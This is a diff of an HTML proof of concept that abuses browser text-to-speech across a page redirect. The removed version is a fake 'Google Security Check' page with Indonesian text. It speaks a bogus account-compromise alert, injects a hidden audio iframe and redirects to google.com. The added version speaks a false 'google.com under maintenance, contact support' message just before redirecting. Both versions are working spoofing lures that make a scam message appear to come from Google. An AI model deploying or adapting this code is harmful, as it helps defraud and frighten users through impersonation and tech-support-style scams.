@@ -1,175 +1,69 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Security Verification</title>
+<title>SpeechSynthesis Redirect PoC (Controlled)</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; text-align: center; cursor: pointer; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
-  h2 { color: #4285f4; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 60px;
+  }
+  button {
+    padding: 15px 30px;
+    font-size: 20px;
+    cursor: pointer;
+  }
+  #status {
+    margin-top: 20px;
+    font-size: 18px;
+    color: darkred;
+  }
 </style>
 </head>
 <body>
 
-<div class="panel" id="main-card">
-  <h2>🔒 Google Security Check</h2>
-  <p>Klik untuk memverifikasi akun Google Anda.</p>
-  <div id="log">Sistem siap.</div>
-</div>
-
-<div id="launcher-container" style="display: none;"></div>
+<h2>CLICK TO GOOGLE</h2>
+<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
+<div id="status">Status: Waiting...</div>
 
 <script>
-(function () {
-  'use strict';
+const btn = document.getElementById('speechBtn');
+const status = document.getElementById('status');
 
-  var logEl = document.getElementById('log');
-  var executed = false;
+btn.addEventListener('click', () => {
 
-  function log(msg) {
-    logEl.innerHTML += "> " + msg + "<br>";
-    console.log(msg);
+  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
+
+  if (!('speechSynthesis' in window)) {
+    status.textContent = "SpeechSynthesis not supported.";
+    return;
   }
 
-  // ============================================
-  // KONFIGURASI
-  // ============================================
-  var TARGET_URL = "https://www.google.com";
-  
-  var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0
-    }
-  };
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.lang = 'en-US';
 
-  // ============================================
-  // 1. AUDIO UNLOCK & TTS
-  // ============================================
-  function initAudio() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') ctx.resume();
-      
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      osc.type = 'sine';
-      osc.frequency.value = 880;
-      gain.gain.value = 0.05;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.5);
-      
-      log("[+] AudioContext Unlocked.");
-    } catch(e) {
-      log("[-] Audio Error: " + e.message);
-    }
-  }
+  const voices = speechSynthesis.getVoices();
+  const enVoice = voices.find(v => v.lang.startsWith('en'));
+  if (enVoice) utter.voice = enVoice;
 
-  function startTTS() {
-    if (!('speechSynthesis' in window)) {
-      log("[-] TTS tidak didukung.");
-      return;
-    }
-    try {
-      window.speechSynthesis.cancel();
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.volume = CONFIG.tts.volume;
+  status.textContent = "Preparing redirect...";
 
-      u.onstart = function() { log("[+] TTS Berbunyi..."); };
-      u.onend = function() { log("[+] TTS Selesai."); };
-      u.onerror = function(e) { log("[-] TTS Error: " + e.error); };
+  // Redirect cepat
+  setTimeout(() => {
 
-      window.speechSynthesis.speak(u);
-      log("[+] TTS dimulai.");
-    } catch(e) {
-      log("[-] TTS Error: " + e.message);
-    }
-  }
+    // Trigger speech tepat sebelum navigasi
+    speechSynthesis.speak(utter);
+    console.log("[PoC] Speech triggered");
 
-  // ============================================
-  // 2. INJECT IFRAME AUDIO (BACKUP)
-  // ============================================
-  function injectAudioIframe() {
-    try {
-      var iframe = document.createElement('iframe');
-      iframe.allow = "autoplay";
-      iframe.style.display = "none";
-      
-      iframe.srcdoc = `
-        <!DOCTYPE html>
-        <html>
-        <body>
-          <script>
-            if ('speechSynthesis' in window) {
-              var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised.");
-              u.lang = 'en-US';
-              u.volume = 1.0;
-              window.speechSynthesis.speak(u);
-            }
-            try {
-              var ctx = new (window.AudioContext || window.webkitAudioContext)();
-              if (ctx.state === 'suspended') ctx.resume();
-              var osc = ctx.createOscillator();
-              osc.frequency.value = 880;
-              osc.connect(ctx.destination);
-              osc.start();
-              osc.stop(ctx.currentTime + 0.5);
-            } catch(e) {}
-          <\/script>
-        </body>
-        </html>
-      `;
+    // Navigasi langsung setelah speech dipanggil
+    window.location.replace('https://google.com');
 
-      document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Iframe Audio disuntikkan.");
-    } catch(e) {}
-  }
+  }, 300); // delay kecil (bisa tweak 100–500ms untuk testing)
 
-  // ============================================
-  // 3. TRIGGER (KLIK - INSTANT)
-  // ============================================
-  document.body.addEventListener('click', function() {
-    if (executed) return;
-    executed = true;
-
-    document.getElementById('main-card').innerHTML = `
-      <h2>⏳ Memverifikasi...</h2>
-      <p>Menghubungkan ke Google...</p>
-      <div id="log"></div>
-    `;
-    logEl = document.getElementById('log');
-    log("[!] Memulai TTS Persistence...");
-
-    // A. Audio Init (0ms)
-    initAudio();
-    startTTS();
-
-    // B. Inject Iframe Audio (10ms)
-    setTimeout(injectAudioIframe, 10);
-
-    // C. REDIRECT KE GOOGLE (LANGSUNG!)
-    setTimeout(function() {
-      log("[+] Redirect ke Google.com...");
-      try {
-        window.location.replace(TARGET_URL);
-      } catch(e) {}
-    }, 50); // 50ms untuk memberi waktu TTS mulai
-
-  }, { once: true });
-
-})();
+});
 </script>
+
 </body>
 </html>
